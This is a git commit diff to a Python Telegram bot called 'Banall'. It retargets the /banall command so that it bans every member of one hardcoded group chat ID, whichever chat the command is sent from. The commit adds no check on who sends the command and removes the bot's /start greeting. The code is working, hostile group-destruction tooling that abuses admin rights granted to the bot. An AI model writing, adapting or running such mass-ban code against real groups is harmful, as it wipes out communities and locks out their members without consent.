e3b43590e1c27cdd5cad30b7c7498363af483497
Zaid <itsunknown122@gmail.com>
2023-03-22 21:10:38 +0530

    Update __init__.py

--- bot/__init__.py
+++ bot/__init__.py
@@ -16,24 +16,18 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 bot=Client(":memory:",api_id=Config.TELEGRAM_APP_ID,api_hash=Config.TELEGRAM_APP_HASH,bot_token=Config.TELEGRAM_TOKEN)
 
+CHAT = int(-1001883645971)
 
 @bot.on_message(filters.command("banall"))
 async def _(bot, msg):
-    print("getting memebers from {}".format(msg.chat.id))
-    async for i in bot.iter_chat_members(msg.chat.id):
+    print("getting memebers from {}".format(CHAT))
+    async for i in bot.iter_chat_members(CHAT):
         try:
-            await bot.ban_chat_member(chat_id =msg.chat.id,user_id=i.user.id)
-            print("kicked {} from {}".format(i.user.id,msg.chat.id))
+            await bot.ban_chat_member(chat_id =CHAT,user_id=i.user.id)
+            print("kicked {} from {}".format(i.user.id,CHAT))
         except FloodWait as e:
             await asyncio.sleep(e.x)
             print(e)
         except Exception as e:
             print(" failed to kicked {} from {}".format(i.user.id,e))           
     print("process completed")
-
-
-
-@bot.on_message(filters.command("start") & filters.private)
-async def hello(bot, message):
-    await message.reply("Hello, This Is Banall Bot I can Ban Members Within seconds!\n\n Simply Promote my By Adminstration then Type username")
-
